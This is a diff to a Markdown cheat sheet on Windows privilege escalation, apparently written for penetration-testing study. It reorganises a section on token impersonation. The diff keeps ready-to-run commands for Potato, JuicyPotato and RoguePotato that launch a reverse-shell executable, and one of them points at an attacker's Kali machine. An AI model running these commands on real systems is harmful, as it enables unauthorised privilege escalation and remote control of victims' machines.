@@ -4,6 +4,26 @@
 - [Kernel Exploit](#kernel-exploit)
 - [Services](#services)
 	- [Attacking Insecure Service Permissions](#attacking-insecure-service-permissions)
+	- [Attacking Unquoted Service Path](#attacking-unquoted-service-path)
+	- [Attacking Weak Registry Permissions](#attacking-weak-registry-permissions)
+	- [Attacking Insecure Service Executables](#attacking-insecure-service-executables)
+	- [DLL Hijacking](#dll-hijacking)
+- [Registry](#registry)
+	- [AutoRuns](#autoruns)
+	- [AlwaysInstallElevated](#alwaysinstallelevated)
+- [Passwords](#passwords)
+	- [Registry](#registry)
+	- [Saved Creds](#saved-creds)
+	- [Configuration Files](#configuration-files)
+	- [SAM/SYSTEM Backups](#sam/system-backups)
+- [Scheduled Tasks](#scheduled-tasks)
+- [Breakout](#breakout)
+- [Startup Apps](#startup-apps)
+- [Token Impersonation](#token-impersonation)
+	- [Hot Potato](#hot-potato)
+	- [Juicy Potato](#juicy-potato)
+	- [Rogue Potato](#rogue-potato)
+	- [PrintSpoofer](#printspoofer)
 
 ## Kernel Exploit
 
@@ -955,7 +975,13 @@ oLink.Save
 
 This will trigger your reverse shell when an admin logins.
 
-## Hot Potato
+## Token Impersonation
+Service accounts can be given special privileges in order for them to run their services, and cannot be logged into directly.
+Unfortunately, multiple problems have been found with service accounts, making them easier to escalate privileges with.
+
+ "SeImpersonatePrivilege/SeAssignPrimaryToken" privilege needed to be enabled.
+
+### Hot Potato
 
 Source code found at `https://github.com/foxglovesec/Potato`
 
@@ -1010,13 +1036,6 @@ Potato.exe -enable_token true -enable_httpserver true -enable_defender_scan true
 Potato.exe
 ```
 
-
-## Token Impersonation
-Service accounts can be given special privileges in order for them to run their services, and cannot be logged into directly.
-Unfortunately, multiple problems have been found with service accounts, making them easier to escalate privileges with.
-
- "SeImpersonatePrivilege/SeAssignPrimaryToken" privilege needed to be enabled.
-
 ### Juicy Potato
 Source code can be found at `https://github.com/ohpe/juicy-potato`
 > C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
@@ -1039,7 +1058,7 @@ Source code can be found at `https://github.com/ohpe/juicy-potato`
 	- On Windows Victim machine:
 		> C:\PrivEsc\RoguePotato.exe -r [Kali IP Machine] –l 9999 -e "C:\PrivEsc\reverse.exe"
   
-### PrintSpoofer:
+### PrintSpoofer
 - PrintSpoofer is an exploit that targets the Print Spooler service.
 	- GitHub: https://github.com/itm4n/PrintSpoofer
 	- Blog: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges
